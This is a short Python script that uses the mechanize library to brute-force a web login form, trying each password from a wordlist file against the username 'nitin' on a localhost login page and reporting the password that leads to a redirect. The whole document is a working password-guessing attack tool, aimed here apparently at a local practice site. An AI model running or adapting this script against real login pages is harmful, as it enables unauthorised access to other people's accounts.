import mechanize
b = mechanize.Browser()
url = "http://localhost/register/login.php"
wordlist = "pass.txt"
try:
	wordlist = open(wordlist, "r")
except:
	print("\nWordlist not found")
	quit()
for password in wordlist:
	response = b.open(url)
	b.select_form("login")
	b.form['username'] = 'nitin'
	b.form['password'] = password.strip()
	b.method = "POST"
	response = b.submit()
	if response.geturl() == "http://localhost/register/index.php":
		print("Password found: " + password.strip())
		break
else:
	print("Password not found")
